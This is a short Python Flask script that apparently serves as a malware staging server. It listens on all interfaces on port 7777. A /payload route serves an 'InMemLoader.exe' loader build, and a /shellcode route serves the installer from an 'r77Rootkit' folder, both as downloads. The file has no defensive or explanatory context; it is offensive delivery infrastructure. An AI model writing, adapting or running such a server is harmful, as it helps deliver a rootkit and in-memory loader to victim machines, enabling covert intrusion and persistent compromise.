from flask import send_from_directory, Flask

app = Flask(__name__)

PAYLOAD_DIR = r'C:\Users\mxmla\source\repos\InMemLoader\InMemLoader\bin\Debug\net8.0'  # Update this path with the actual folder location
PAYLOAD_FILE = 'InMemLoader.exe'  # Name of the client.exe you want to serve
Shellcode_dir = r'C:\Users\mxmla\Downloads\r77Rootkit 1.7.0'
shellcode_FILE = 'install.exe'

@app.route('/payload', methods=['GET'])
def download_payload():
    try:
        return send_from_directory(PAYLOAD_DIR, PAYLOAD_FILE, as_attachment=True)
    except Exception as e:
        return f"Error: {str(e)}", 500

@app.route('/shellcode', methods=['GET'])
def download_shellcode():
    # Serve the shellcode file
    try:
        return send_from_directory(Shellcode_dir, shellcode_FILE, as_attachment=True)
    except Exception as e:
        return f"Error: {str(e)}", 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=7777)